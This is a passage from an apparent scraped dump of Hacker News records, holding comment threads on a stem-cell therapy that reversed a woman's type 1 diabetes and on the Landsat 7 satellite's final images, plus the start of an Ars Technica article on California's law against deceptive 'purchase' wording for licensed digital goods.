approval to test genetically modified beta cells that a type 1 wont destroy. Thanks for any understanding and compassion you can bring to this discussion. reply ainiriand 12 hours agorootparentMy wife has a closed-loop system here in Germany, that is a small pod she changes every 3 days with the insulin loaded into and a wireless monitoring device in the arm that syncs to the phone. She is way into 95% or more in range and she lives a normal life. I think immunodepressants would not be the solution for her. reply cut3 2 hours agorootparentSimilar story for my partner in the USA. reply zbyforgotp 9 hours agorootparentprevWhat is the range that she is keeping? reply sgmoore 8 hours agorootparentprev> Since our errant immunity is localized on the insulin producing beta cells being on immune supressants would still be better than being insulin deoendent As a Type 1 diabetic, I'm not sure I would agree. Surely immune suppressants would suppress our whole immune system not just the faulty bit which opens us up to all sorts of problems. I don't think that is someone I would like to risk just to avoid taking insulin. Mind you I have to confess my attitude might be affected by the fact that I don't have to pay for insulin. reply jcims 14 hours agorootparentprevMy youngest was diagnosed with type 1 diabetes at 14 and it has been a tremendous emotional and physical burden on her. It's so encouraging to see research in this area and the faintest glimmer of a hope for a hope that she'll find relief. reply boltzmann-brain 12 hours agorootparentprevis it possible for a type 1 diabetic to not know and live their life fully untreated? By this I don't mean every type 1 diabetic, what I'm asking is whether it's possible for someone to be like this, due to their specific health circumstances. reply TrackerFF 10 hours agorootparentMy in-law (brother) got what is called diabetes type \"1.5\", or LADA (latent autoimmune diabetes in adults), at the ripe age of 40. It is like type 1, but much, much slower progressing - hence why it shows up at adult age, compared to childhood. Unlike type 2, you can't keep it under control by lifestyle changes. My in-law is a physically fit person with a good diet, and has been his whole life. In any case, after the onset of symptoms, he had to get treatment. No treatment leads to further organ damage, which eventually leads to death. reply dghughes 8 hours agorootparentPossibly caused by a virus. A person can develop type 1 diabetes from the effects of a virus like measles and other viruses. I don't think many people are aware of that. reply 9baka 4 hours agorootparentAutoimmune conditions can stem from viral infections, yes. But most of the time type-1 diabetics have a very weak phenotype of the disease, that is to say, the patient has pancreatic antibodies (specifically beta-cell antibodies) and produces them very, very slowly. According to this source, half of all \"new cases\" (whatever that means) occurs in adults: https://diabetesjournals.org/care/article/44/11/2449/138477/... reply solveit 12 hours agorootparentprevI'm not quite sure how exactly to interpret your question, but untreated type 1 diabetes usually kills you within five years of diagnosis. reply boltzmann-brain 6 hours agorootparenti'm asking about what may happen when the illness isn't, in your words, usual reply looperhacks 12 hours agorootparentprevIt's not possible. Type 1 diabetes stops the production of insulin, which is generally required for survival. reply titusjohnson 2 hours agorootparentprevMy partner is a rare example of this. A little over 2 years ago at the age of 37 she was diagnosed as diabetic and put on metformin. The doctor thought it was LADA, or Type 1.5. The then the doctor kinda.... forgot about her? Historically he's been a terrible primary care doctor, just shoves pills and has no discussions so I wasn't super surprised. I'd been asking her to switch doctors for 3 years at that point due to some bad pill prescriptions that sent her suicidal. She was on metformin for 18 months with no meetings with her doctor beyond switching from an instant release to an extended release due to stomach pain. She got really irritated at me for suggesting that she be touching base with her doctor and progressing the care along, so I just dropped the topic and helped with carb counting, meal planning, and paid for a personal trainer. About 6 months ago she suddenly started dropping weight. Extreme exhaustion (winded after going up a flight of stairs), dropped 30 pounds in two months, she was starting to get skeletal. Still not being active with her healthcare, but when she went under 110lbs for the first time since she was 14, she finally found the motivation she needed to get proactive and quickly found a better team of doctors who diagnosed her with Type 1 and put her on Insulin immediately. Today we're putting her 2nd Omnipod on her for insulin delivery. She should get a closed loop system soon, I guess the iPhone support for her Omnipod+Dexcom combo is still going through FDA approval. Her new team says she's lucky to be alive at all. They've been going through her extensive medical history, pointing at occasions when she was hospitalized during her menses and saying \"here you were going through diabetic ketoacidosis, that's why you were vomiting constantly\", \"every evening you're going critically low, that's why family thought you were a closet alcoholic\", and \"on average during the day your blood glucose is far, far too high, that's why you drink and piss gallons of water per day but are never sated\". So... I guess yes you can get lucky and survive, but with symptoms strong enough that it _should_ be caught. reply drivebycomment 14 hours agorootparentprevFrom the article: > Because the woman was already receiving immunosuppressants for a previous liver transplant, This makes sense - this was the first trial, so doing this on a person already on immunosuppressants minimizes risk while still validating the basics of if it works at all in the first place. reply heisenzombie 11 hours agorootparentprevI believe it’s already reasonably common to give a person Type 1 diabetes a pancreas transplant if they have another transplant and will therefore be taking immunosuppressants anyway. It’s true that you wouldn’t do this unless they were already needed, say, a liver transplant. reply bmau5 20 hours agoprevAmazing! Hopefully the effects are sustained over the long term and can be replicated. The potential of the stem cell space is incredible. Another interesting development is patients \"cured\" of HIV following stem cell transplants to treat leukaemia - which has no direct clinical implications given the significant risk of stem cell transplant but does inspire hope for the future [1]. Edit: Source: https://www.who.int/news/item/25-07-2024-a-seventh-case-of-h... reply wombatpm 17 hours agoparentI’m surprised more people didn’t try that route earlier. Step one in stem cell transplant for leukemia it to kill all existing immune cells. HIV hides in immune cells. I think too many HIV patients were too compromised by opportunistic infections to ever be healthy enough for stem cell transplants reply Projectiboga 15 hours agorootparentNowadays many hiv positive individuals are in better than average health. And a fluke for the ones diagnosed with AIDS they enjoy a slightly longer than average lufe expectancy. This is part a survivor bias, where only the fittest of tgat cohort survived. It is also due to their being eledgable for medicaid with double the income of anyone else. reply cedric_h 17 hours agoparentprevTFA claims the stem cells were administered into the abdominal muscles, which may reduce the \"significant risk of stem cell transplant\" compared to direct injection into the liver. reply anon84873628 13 hours agorootparentI'm curious why they don't transplant into the pancreas? reply 9baka 4 hours agorootparentThe point of stem cell treatments is to replace cells that are no longer there doing their job. It's not too relevant for the replaced cells to be in the same spot, as long as they exist and produce insulin, you are good to go. You could argue for the location having physiological implications, for instance: it's convenient for the liver to be right after the intestines (connected through the portal vein), like this, it metabolizes large amounts of whatever is absorbed intestinally at once, before it reaches systemic circulation. This may hold true for the pancreas as well. It uses duodenal glucose concentrations to know exactly how much insulin to release, which may not be representative of the rest body's glucose concentrations. Practically speaking, it is far safer to inject stem cells in the abdomen where you have room for erscqror and can do surgery on without much trouble vs the pancreas, if anything goes wrong there, you could easily kill a patient. reply ygouzerh 8 hours agorootparentprevIt seems from the article that it's harder to monitor, so by injecting in the abdomen they can monitor them using MRI and remove them if needed. reply inglor_cz 11 hours agorootparentprevStem cells are pretty good at moving around. If they don't want to stay in the pancreas, you won't be able to make them, and if they want to go to the pancreas, they will find their way there even if transplanted in a less invasive way. reply BuildWithMason 16 hours agoprevThis is a fascinating development, especially for type 1 diabetes, where autoimmunity is such a challenge. Using the patient’s own reprogrammed cells to avoid immune rejection is promising. reply PakG1 14 hours agoprevI've been waiting for stem cell therapy to regrow my recessed gums. Every option for taking care of my recessed gums seem horrible and my gums are so far gone. Wish I'd have developed better habits for taking care of them when I was younger but oh well. reply elric 13 hours agoparent> Wish I'd have developed better habits That's always easier said than done, isn't it? I'm sure many of us wish they had taken better care of their bodies when they were younger, but sometimes life gets in the way, long term impacts are unclear, and we overestimate our ability to \"fix it later\". reply fredrikholm 12 hours agorootparentIt's also important to not underestimate just how powerful lifestyle changes can be even in the face of (a lot of our potential) dire outcomes. Not sure about gums here specifically. Reversing a condition once you have it is an order of magnitude more difficult to fix than to prevent, but if you're in luck and able to do so, every day now has the potential for taking a step in the right direction. My favorite example of this is post-menopausal women regaining bone density, muscle mass, balance, mood etc. to rival women half their age in a matter of a few weeks (weight training). The same can be said for pre-diabetes, early T2, high blood pressure, addictions... the list goes on. With regards to OP, I hope you find some relief somehow! I still have some baby teeth with very short roots; the second I get inflamed gums my pain level approaches levels were I can't function properly. What is the symptoms of receded gums? reply elric 12 hours agorootparent> It's also important to not underestimate just how powerful lifestyle changes can be Agreed, what's that phrase, \"The best time to start was 20 years ago, the second best time is now\"? But it's also important to be a little kind to yourself, don't be too harsh on yourself for the things you didn't do or could have done differently. You can't go back in time. reply WilTimSon 11 hours agoparentprevOut of curiosity, what habits would you adopt? Flossing? Or is there something else doctors recommend? A cursory search seems to bring up rather regular dental hygiene. reply PakG1 2 hours agorootparentI had all the habits, I just wasn't prioritizing them if I was tired or sleeping late due to school/work/stuff. I probably should have prioritized set times to do them each day irregardless of what I was doing. Plus, I didn't take seriously the habit to brush for several minutes instead of several seconds. reply inglor_cz 11 hours agorootparentprevNot the OP, but on top of cleaning the gaps between teeth well, I started going to dental hygienist four times a year and the expense seems to be worth it. Nowadays my gums just don't bleed ever, period, even when the hygienist is scrapping away calculus. reply MaKey 10 hours agoparentprevI had a transplant for my recessed gum and the results are great. Maybe that could be an option for you too. reply PakG1 2 hours agorootparentFrom your own mouth or from cadavers? Cadavers sounds freaky to me, from my own mouth seems like I'm just robbing Peter to pay Paul, but maybe it's worth it. reply josvdwest 13 hours agoparentprevWould love stem cells for gum recovery! reply ygouzerh 8 hours agoprevThat's awesome! My sister got diabetes Type 1 few years ago and was loosing hope. That's a very great news for her and all the people that have to lived with it and who we told there was no cure when they got it. reply loceng 5 hours agoprevI have wondered for awhile what just injecting [fresh] placental/umbilical cord tissue into people with various autoimmune issues may result in, as apparently it has powerful immune system regulators in it; I've not looked for related research yet though. reply blackeyeblitzar 12 hours agoprev [–] Interesting that the stem reprogramming technique was invented 20 years ago. I wonder if all who contributed to this over the years will get their due rewards. I feel they won’t, which makes me sad. Amazing results and huge potential for diabetes but also other conditions. reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "A 25-year-old woman with type 1 diabetes became the first person to produce her own insulin after a stem cell transplant, remaining insulin-free for over a year.",
      "The stem cells were reprogrammed from her own body and injected into her abdominal muscles, leading to stable blood glucose levels within two-and-a-half months.",
      "This pioneering trial, led by Deng Hongkui from Peking University, marks a significant advancement in diabetes treatment, with further trials planned to replicate the results."
    ],
    "commentSummary": [
      "A woman with Type 1 diabetes experienced a reversal of her condition through stem cell therapy while on immunosuppressants for a prior liver transplant.",
      "This breakthrough is significant for Type 1 diabetes, an autoimmune disorder, and raises hopes for future treatments despite concerns about long-term effects and the need for immunosuppressants.",
      "The success of stem cell therapy in this case also suggests potential applications in other areas, such as HIV treatment."
    ],
    "points": 261,
    "commentCount": 41,
    "retryCount": 0,
    "time": 1727389700
  },
  {
    "id": 41663465,
    "title": "End of an era: Landsat 7 mission takes final images",
    "originLink": "https://www.usgs.gov/news/national-news-release/end-era-historic-landsat-7-mission-takes-final-images",
    "originBody": "Breadcrumb National News Release Breadcrumb National News Release End of an era: Historic Landsat 7 mission takes final images Retiring satellite makes way for upcoming enhanced science mission By Communications and Publishing September 19, 2024 RESTON, Va. — After more than 132,000 trips around the Earth and more than 3.3 million satellite images under its belt, the work of the Landsat 7 satellite is complete, even as the Landsat science mission continues with newer satellites. A joint mission between the U.S. Geological Survey (USGS) and NASA, Landsat 7 was initially designed for a five-year mission. Beating the odds, the satellite observed the Earth for a quarter-century, delivering invaluable scientific data for the benefit of all humanity. Sources/Usage: Public Domain. View Media Details Illustration of Landsat 7 in orbit Landsat 7 captured one of its final images on May 28 over Las Vegas, Nevada. Show only left Show only right Sources/Usage: Public Domain. View Media Details Download Images These Landsat 7 images showcase the first and last captures of the Las Vegas area, taken on July 4, 1999, and May 28, 2024, respectively. The images highlight the city, the surrounding desert landscape, and Lake Mead, using shortwave infrared (SWIR), near-infrared (NIR), and red bands to emphasize differences in vegetation, water, and urban growth. The final image, marking the satellite’s 25th anniversary, stands as a tribute to Landsat 7's quarter-century legacy of Earth observation. Since its launch on April 15, 1999, Landsat 7 provided a wealth of imagery, enabling scientists, policymakers, and conservationists to track changes in land use, natural disasters, and environmental degradation with unprecedented accuracy. Sources/Usage: Public Domain. View Media Details Landsat 7 was successfully launched on April 15, 1999, from the Western Test Range of Vandenberg Air Force Base, California, on a Delta II expendable launch vehicle. “Landsat 7 data have been pivotal in documenting environmental changes such as natural disasters, deforestation, and urban growth over its 25 years,” said David Applegate, USGS Director. “Notably capturing significant events like Hurricane Katrina in 2005, the Haiti earthquake in 2010, the Australian bushfires in 2019 - 2020, the dramatic growth of cities worldwide and more through its long-standing mission.” Sources/Usage: Public Domain. View Media Details This true-color image was taken by the Enhanced Thematic Mapper Plus (ETM+) sensor aboard the Landsat 7 satellite on September 12, 2001, at roughly 11:30 a.m. Eastern Daylight Savings Time. A day after the attack, smoke continues to billow out of the collapsed Twin Towers. Sources/Usage: Public Domain. View Media Details These Landsat 7 images show the damage that New Orleans, Louisiana, received as a result of Hurricane Katrina. The data have proven to be a useful asset as the foundation for countless studies, enhancing our understanding of agriculture, water resources, and wildland fires. By providing consistent data every eight days in conjunction with Landsat 5 until 2012, Landsat 7 improved our ability to monitor seasonal changes. Thanks to operational enhancements, Landsat 7 nearly doubled the daily data collected, from 250 to 450 scenes. The Land Imaging Satellite that Could When it was launched, Landsat 7 featured the Enhanced Thematic Mapper Plus (ETM+) sensor, which built upon and improved the capabilities of its predecessors, the Thematic Mapper (TM) sensor used on Landsat 4 and Landsat 5. As an eight-band, multispectral scanning radiometer, the ETM+ offered improvements over previous sensor technology including a 15-meter spatial resolution panchromatic band and 60-meter resolution thermal band. Sources/Usage: Public Domain. View Media Details This color infrared image of Southeast South Dakota was advertised as the first image acquired by Landsat 7's Enhanced Thematic Mapper Plus (ETM+) sensor on April 18, 1999. The Missouri River flows from the middle left of the image, to the lower right, where the Fort Randall Dam creates Lake Francis Case. However, four years after Landsat 7’s launch, a piece of equipment known as the Scan Line Corrector failed on the ETM+, impacting the satellite's ability to capture complete images of the Earth's surface. This led to “striping,” or gaps in its data. Despite the setback, 78 percent of a scene’s pixels are still usable and are considered some of the world’s most geometrically and radiometrically accurate civilian satellite data. Sources/Usage: Public Domain. View Media Details A Landsat 7 SLC-off Scene Example Landsat 7 went on to produce images for five times its expected operational lifespan. Sources/Usage: Public Domain. View Media Details For 25 years, the Landsat 7 satellite acquired millions of images of Earth that supported studies of how land is used and how it has changed across urban, agriculture, forest, snow and ice-covered areas around the globe, as well as natural and manmade disasters. As the mission comes to a close, we look back at the magnitude and impact that Landsat 7 imagery brought to scientists and those interested in studying the Earth's landmasses: Over 5,000 scientific publications in 21 languages across 143 different countries152 of the articles have received a news, blog, and/or patent mention1,414 policy documents across 54 countries that cite 749 journal articles Sources/Usage: Public Domain. View Media Details This image captured by Landsat 7 shows a spinning formation of ice, clouds, and low-lying fog off the eastern coast of Greenland. To allow Landsat 9, launched in September 2021, to share the same orbital position as Landsat 8, the USGS lowered Landsat 7’s orbit. Even at its lower altitude, Landsat 7 continued to collect valuable data. However, being lowered caused Landsat 7 to increasingly drift within its orbit. The drift exposed it to periods of full sunlight and earlier imaging times, impacting battery maintenance, imaging opportunities, and processing of reliable science data. As a result, the USGS decided to end imaging from the aging satellite. Sources/Usage: Public Domain. View Media Details A series of rocky outcroppings are a prominent feature of this Sahara Desert landscape near the Terkezi Oasis in the country of Chad captured by Landsat 7. Today, Landsat operates with two satellites, Landsats 8 and 9, that work together to compile a complete set of Earth land images every 8 days. Sources/Usage: Public Domain. View Media Details Landsat 7 captured Guinea-Bissau is a small country in West Africa. Complex patterns can be seen in the shallow waters along its coastline, where silt carried by the Geba and other rivers washes out into the Atlantic Ocean. The Landsat Mission Continues With the end of Landsat 7’s role in the Landsat science mission and the advancing age of Landsat 8, launched in 2013, attention is now directed toward the Landsat Next mission as a critical next step to ensure continuity of Landsat’s unique global Earth science mission. The USGS is currently focused on ensuring the flow of data remains uninterrupted and that the quality of information keeps pace with evolving technological and environmental demands. The newest mission, known as Landsat Next, promises enhanced capabilities over its predecessors, including improved spatial resolution, increased spectral bands, and faster revisit times. These advancements are essential for more detailed and frequent monitoring of Earth's changing landscapes and for supporting critical decisions in climate resiliency, disaster response, agriculture and water management. Sources/Usage: Public Domain. View Media Details Landsat Next satellites circling the Earth. The mission is planned for late 2030/early 2031. Landsat Next is designed not only to continue the legacy of Landsat, but also to innovate and adapt to the pressing challenges of the 21st century, ensuring that scientists, policymakers, industry, and the public have access to the information needed to better monitor and sustainably manage our ever-changing planet. Get Our News These items are in the RSS feed format (Really Simple Syndication) based on categories such as topics, locations, and more. You can install and RSS reader browser extension, software, or use a third-party service to receive immediate news updates depending on the feed that you have added. If you click the feed links below, they may look strange because they are simply XML code. An RSS reader can easily read this code and push out a notification to you when something new is posted to our site. RSS Icon Information Systems News RSS Icon National News Release News Contacts Michelle Bouchard Communications and Outreach Earth Resources Observation and Science (EROS) Center Email mbouchard@usgs.gov Phone 605-594-6168 Gina Anderson Public Affairs Specialist Communications and Publishing Email granderson@usgs.gov Phone 405-509-3524",
    "commentLink": "https://news.ycombinator.com/item?id=41663465",
    "commentBody": "End of an era: Landsat 7 mission takes final images (usgs.gov)258 points by Qqqwxs 21 hours agohidepastfavorite46 comments bmsan 20 hours agoDang, hits home. When I was a senior in high school, I was lucky to able to volunteer under Dr. Eric Brown De Colstoun at NASA Goddard, checking error rates for tree cover estimates using Landsat data^. Many hours that fall spent trudging around parks and forests, looking at the sky through a PVC pipe. It still kind of blows my mind at how much is able to be gained from images where each pixel is 15mx15m of ground-level area (and, I believe, with an important component of Landsat 7's imaging system broken for most of its lifespan). I also wasn't aware that Landsat program imagery had been made free to access a few years later. Nice. ^(A massive thank you to him, since I wouldn't have graduated without being able to participate in that project. And a massive apology for going on to get a fine arts degree.) reply is_true 16 hours agoparentWhat did you do with the pvc pipe? reply MostlyStable 15 hours agorootparentif I had to guess, they were going to randomly selected locations, looking at the sky through the PVC pipe (presumably straight up), and seeing if it was obstructed by tree canopy or not, and then comparing to whether or not the satellite said there was tree cover in that location reply bargle0 10 hours agoparentprevYeah, the scan line corrector broke. Landsat 7 images had these “whiskers” of missing data running perpendicular to the path. For a while there it was just old Landsat 5 and broken Landsat 7. reply Yawrehto 20 hours agoprevIt seems like a lot of these government-owned space things last a lot longer than they're made for. There's Landsat, Spirit, Opportunity, Hubble, the Voyagers, et cetera. It seems to be a pretty steep curve - either they fail on launch or landing or very early, or they far outlast expectations. There seems to be little that meets expectations. I can see lots of failures - space stuff is hard - but why so many things exceeding it? reply duskwuff 19 hours agoparent> I can see lots of failures - space stuff is hard - but why so many things exceeding it? The design lifetime is treated as a minimum acceptable value; a vehicle which was designed to last 10 years but has a critical component fail at 9.5 would be considered a failure, for instance. This means that the average lifespan of the vehicle gets pushed out a lot further to ensure it meets its goals. With that being said, it's not uncommon for space vehicles to reach end-of-life for reasons other than a system failure - one common one being that a satellite or space probe runs out of propellant. Since the underlying mechanism there is predictable, rather than a random failure, there's much less margin needed. reply aziaziazi 4 hours agorootparentI wonder if the length of all space stuff average out to their acceptable value now ! (fail at launch, rapid unscheduled disassembly and the others going further until exceeding minimum acceptable value) reply wongarsu 20 hours agoparentprevThey build and design everything in a way that ensures a 99% chance that after successful launch and deployment it will last for the mission duration in a harsh and still somewhat unfamiliar environment. That happens to translate into a very high chance that it will still work after twice the mission duration, or ten times the mission duration. Part of this is cultural, part of it is political: nobody wants a failed mission, it's better for the image of the agency and the involved politician to spend a bit more money and underestimate the lifetime. Higher chance of success, and nobody complains if the mission can be extended afterwards. reply noisy_boy 5 hours agoparentprevWhen smart and dedicated people are allowed time to think, plan and execute instead of being constantly forced to sacrifice everything at the altar of next-quarter results, the quality of the output tends to be better. reply beerandt 20 hours agoparentprevBecause you set a min life, but statistics aside, the design for that minimum life isn't usually something that can be tweaked on a continuous scale, but ends up being binned by design constraints. Eg, you need an industrial road with a 5-year lifespan over a swamp. To meet this minimum you actually have to build a bridge, which when built to industry standards, might start at lifespans of 20-30 yrs. Space is a bit different because of budgeting for ongoing operations, so you frontload the cap-x, knowing that asking for addl op-x funds later to extend the program will seem like a no-brainer deal. Plus sometimes it's as simple as: if you design something to statistically survive space launch, it results in something that is overdesigned to just sit in orbit for years (given that it survives that initial launch). It's similar to human lifespan statistics- if you get over the historical infant mortality hump, every adult seems 'overdesigned' compared to the historical expected lifespan. reply userbinator 17 hours agoparentprevSpace is still a relative unknown, so overbuilding and conservative estimates are far preferred to aggressive cost-cutting and thin margins. You see the same thing with other technologies like cars and appliances -- early versions were mostly very overbuilt. reply mmooss 12 hours agoparentprevBasic consulting: Underpromise, overdeliver. Nobody knows how long a Mars rover should last; NASA perhaps picks a number so low that they can't fail, and then have another narrative about the amazing little robot that kept going, and which makes the investment look great for taxpayers. reply bmsan 20 hours agoparentprevFor this particular satellite, I think it's actually both. One of the components of the imaging system failed relatively early on[1], but they've worked around the issue for the past 20 years. 1: https://landsat.gsfc.nasa.gov/satellites/landsat-7/ reply callmeal 8 hours agoparentprev>government-owned space things last a lot longer than they're made for Don't forget that once upon a time, commercial-owned things lasted a lot longer too. Unfortunately the mba's took over and planned obsolescence became a thing. reply conception 20 hours agoparentprevThe engineering to get it to last a year probably isn’t significantly different from five years, etc. reply bwy 19 hours agoparentprevLindy effect? If something is built to last 10 years, it makes it likelier that it can survive another 10. reply Palomides 19 hours agoparentprevall hardware is subject to the bathtub curve reply tiffanyh 20 hours agoprevIn the Las Vegas slider, the Lake Mead before/after difference is startling. reply syncsynchalt 17 hours agoparentThe after photo is actually _up_ substantially from 2022. reply trhway 8 hours agoparentprevAral Sea (https://earthobservatory.nasa.gov/world-of-change/AralSea - notice the 1960 outline in pale yellow before starting the 2000-2018 playback) and Lake Chad i'd say even more startling. reply whimsicalism 18 hours agoparentprevyou can also see a massive solar plant in red in the bottom right (and maybe also wind - although why they would both be red is beyond me) reply foolfoolz 16 hours agoparentprevthis is because we siphon water from rivers, mostly for agriculture reply Dalewyn 20 hours agoparentprevI'm more intrigued at the increased green of the landscape at large, did the water supply actually improve to encourage more plant growth? reply stouset 20 hours agorootparentThe diminishing quantities of blue stuff got put on the brown stuff to turn it into green stuff. reply eep_social 20 hours agorootparentBy people, in case that isn’t clear. reply syncsynchalt 17 hours agorootparentprevMay is much greener than July. reply daamsie 19 hours agorootparentprevThe photo from '99 was taken in May. The recent one was in July. reply syncsynchalt 17 hours agorootparentOther way 'round. That's why the after photo is so green, May is much greener than July. reply antman 19 hours agoprevHistory of Landsat is very interesting https://www.space.com/19665-landsat.html reply kragen 7 hours agoprevperhaps the most important news to me here is that landsat 9 was launched in 02021. landsat 8 is also still alive and kicking! reply maxclark 20 hours agoprevLife expectancy is statistical probability The mission targets a length of time, then the engineering matches for the design and build Reality is usually much longer reply ks2048 16 hours agoprevAmazing what a rounding error in the federal budget can do for humanity. More please. reply mmooss 12 hours agoparentAre you volunteering to pay more taxes? reply 082349872349872 6 hours agorootparentIn parts of the world without the HN anti-tax reflex, voting to increase taxes, in order to increase provision of goods and services, occurs. Lagniappe: https://www.youtube.com/watch?v=8lMOL7GaPWI reply andrewinardeer 10 hours agorootparentprevI would if I could choose which program the money was directed at. reply mmooss 14 minutes agorootparentI think you should, and o should I. Now how do we work out which programs get funded? And what about the other people on HN? In the country? I think you should get a vote, and have every chance to persuade them to vote your way. (I also think you should listen to others' ideas, just in case!) reply basementcat 4 hours agorootparentprevYou can do so via several methods. * Voting - You can select candidates for public service who will author or approve legislation that directs your taxes to projects you support. * Lobbying - You can try to convince public servants and other public officials to enact legislation and/or regulations that directs your taxes to projects you support. * Campaigning - You can try to convince other voters to vote for candidates for public service who will author or approve legislation that directs your taxes to projects you support. * Lawsuit - You can try to convince one or more federal judges to interpret existing laws in such a way that your taxes are directed to projects you support. * Run for office - You can place yourself on the ballot and promise your constituents to vote for legislation that directs your taxes to projects you support. reply Waterluvian 19 hours agoprevA lot of my undergrad and grad school involved using ETM+ imagery. Gosh does that sink in how long ago that was. reply littlestymaar 10 hours agoprevThe two different pictures of Las Vegas in 1999 and 2024 shows the environmental tragedy unfolding: the city doubled in size, and Lake Mead shrank. reply helpfulclippy 6 hours agoparentThe overwhelming majority of the water does not go to Las Vegas (https://en.m.wikipedia.org/wiki/Colorado_River_Compact) — Nevada is only allocated 4% of the total water drawn from the Lower Colorado River. Las Vegas gets blamed due to its proximity to Lake Mead and the fact that it is in a desert, but it’s actually adopted aggressive water control measures over the years (see https://www.snwa.com/conservation/understand-laws-ordinances... for recent examples). Also worth noting that while the colorizations of these satellite photos tend to paint the city in green, it is NOT very green at all. Clark County deprecated lawns ages ago by banning new ones and paying people to remove their existing lawns to replace with desert landscaping. But that can only help mitigate the overdraw of the Colorado so much when 96% of the water is going to places that have much less stringent water conservation policy. reply tetris11 7 hours agoparentprevIt looks like it's 20% smaller bounds-wise, but that's the top layer of the lake: the volume reduction must be at around 40-50%... reply Mistletoe 16 hours agoprevFrightening how much smaller Lake Mead is now. > How long does Lake Mead have left? Lake Mead has been facing a water crisis for many years. The water level in the lake has been dropping due to the increasing demand for water and the decreasing supply. If the trend continues, the lake could run out of water in the next 10 to 15 years. Great…I was in Vegas last weekend, I guess they’ll just run it until it’s dry. Humans are ridiculous. reply kibwen 14 hours agoparentThe city of Vegas is among the best and most proactive in the country at water preservation and reclamation. Sadly, it still might not be enough. In the 90s they started paying people to tear up their lawns, and more recently they outlawed lawns and started tearing some up forcefully, and last I checked watering grass still accounted for a double-digit percentage of their water budget. reply helpfulclippy 6 hours agorootparentIrrigating existing grass with Colorado River water is banned effective 2027. reply i3o3o3o 11 hours agoprevnext [2 more] [flagged] edm0nd 11 hours agoparentMy thoughts exactly reply beginnings 19 hours agoprev [–] did somebody pop its balloon? nasa running low on helium? reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "Landsat 7, launched in 1999 by USGS and NASA, has completed its mission after 25 years, capturing over 3.3 million images and 132,000 orbits.",
      "Despite a Scan Line Corrector failure in 2003, the satellite continued to provide valuable Earth observation data, contributing to over 5,000 scientific publications and 1,414 policy documents.",
      "The mission's conclusion makes way for Landsat Next, scheduled for launch in late 2030/early 2031, which promises enhanced capabilities for detailed and frequent Earth monitoring."
    ],
    "commentSummary": [
      "Landsat 7, a satellite known for its significant contributions to earth observation, has captured its final images, marking the end of an era.",
      "Despite a broken scan line corrector, Landsat 7 provided valuable data for years, demonstrating the robustness and longevity of government-owned space missions.",
      "The Landsat program continues with Landsat 8 and 9, ensuring ongoing contributions to earth observation and maintaining the legacy of providing freely accessible imagery."
    ],
    "points": 258,
    "commentCount": 46,
    "retryCount": 0,
    "time": 1727385231
  },
  {
    "id": 41665593,
    "title": "Sony, Ubisoft scandals lead to California ban on deceptive digital goods sales",
    "originLink": "https://arstechnica.com/tech-policy/2024/09/sony-ubisoft-scandals-prompt-calif-ban-on-deceptive-sales-of-digital-goods/",
    "originBody": "No more now you see it, now you don't — Sony, Ubisoft scandals prompt Calif. ban on deceptive sales of digital goods New California law reminds us we don't own games and movies. Ashley Belanger - 9/26/2024, 7:36 PM Enlarge Carol YepesMoment reader comments 86 California recently became the first state to ban deceptive sales of so-called \"disappearing media.\" On Tuesday, Governor Gavin Newsom signed AB 2426 into law, protecting consumers of digital goods like books, movies, and video games from being duped into purchasing content without realizing access was only granted through a temporary license. Sponsored by Democratic assemblymember Jacqui Irwin, the law makes it illegal to \"advertise or offer for sale a digital good to a purchaser with the terms buy, purchase, or any other term which a reasonable person would understand to confer an unrestricted ownership interest in the digital good, or alongside an option for a time-limited rental.\" Moving forward, sellers must clearly mark when a buyer is only receiving a license for—rather than making a purchase of—a digital good. Sellers must also clearly disclose that access to the digital good could be revoked if the seller no longer retains rights to license that good. Perhaps most significantly, these disclosures cannot be buried in terms of service, but \"shall be distinct and separate from any other terms and conditions of the transaction that the purchaser acknowledges or agrees to,\" the law says. An exception applies for goods that are advertised using \"plain language\" that states that \"buying or purchasing the digital good is a license.\" And there are also carve-outs for free goods and subscription services providing limited access based on a subscription's duration. Additionally, it's OK to advertise a digital good if access isn't ever revoked, such as when users purchase a permanent download that can be accessed offline, regardless of a seller's rights to license the content. Ubisoft, Sony called out for consumer harms In a press release earlier this month, Irwin noted that the law was drafted to \"address the increasingly-common instance of consumers losing access to their digital media purchases through no fault of their own.\" She pointed to Ubisoft revoking licenses for purchases of its video game The Crew last April and Sony stirring backlash by threatening to yank access to Discovery TV shows last year as prominent examples of consumer harms. Irwin noted that the US has been monitoring this problem since at least 2016, when the Department of Commerce’s Internet Policy Task Force published a white paper concluding that \"consumers would benefit from more information on the nature of the transactions they enter into, including whether they are paying for access to content or for ownership of a copy, in order to instill greater confidence and enhance participation in the online marketplace.\" It took eight years for the first state lawmakers to follow through on the recommendation, Irwin said, noting that sellers are increasingly licensing content over selling goods and rarely offer refunds for \"disappearing media.\" \"As retailers continue to pivot away from selling physical media, the need for consumer protections on the purchase of digital media has become increasingly more important,\" Irwin said. \"AB 2426 will ensure the false and deceptive advertising from sellers of digital media incorrectly telling consumers they own their purchases becomes a thing of the past.\" In Irwin's press release, University of Michigan law professor Aaron Perzanowski praised California for trailblazing with a law that clearly labels this practice as false advertising. \"Consumers around the world deserve to understand that when they spend money on digital movies, music, books, and games, those so-called ‘purchases’ can disappear without notice,\" Perzanowski said. \"There is still important work to do in securing consumers’ digital rights, but AB 2426 is a crucial step in the right direction.\" reader comments 86 Ashley Belanger Ashley is a senior policy reporter for Ars Technica, dedicated to tracking social impacts of emerging policies and new technologies. She is a Chicago-based journalist with 20 years of experience. Advertisement Channel Ars Technica SITREP: F-16 replacement search a signal of F-35 fail? Footage courtesy of Dvids, Boeing, and The United States Navy. SITREP: F-16 replacement search a signal of F-35 fail? Sitrep: Boeing 707 The F-35's next tech upgrade US Navy Gets an Italian Accent SITREP: DOD Resets Ballistic Missile Interceptor program SITREP: DOD's New Long-Range Air-to-Air Missile Aims to \"Outstick\" China Army's New Pistol Has Had Some Misfires Army's Next (Vertical) Lift En Route SITREP: President Trump's Missile Defense Strategy Hybrid Options for US's Next Top Fighter The Air Force’s Senior Citizen Chopper Can’t Retire Yet Ars Live #23: The History and Future of Tech Law Police re-creation of body camera evidence - Pueblo, COArs Technica Visual Labs body camera software with the Dos Palos PDArs Technica He knew his rights; he got tased anyway More videos ← Previous story Next story → Related Stories Today on Ars",
    "commentLink": "https://news.ycombinator.com/item?id=41665593",
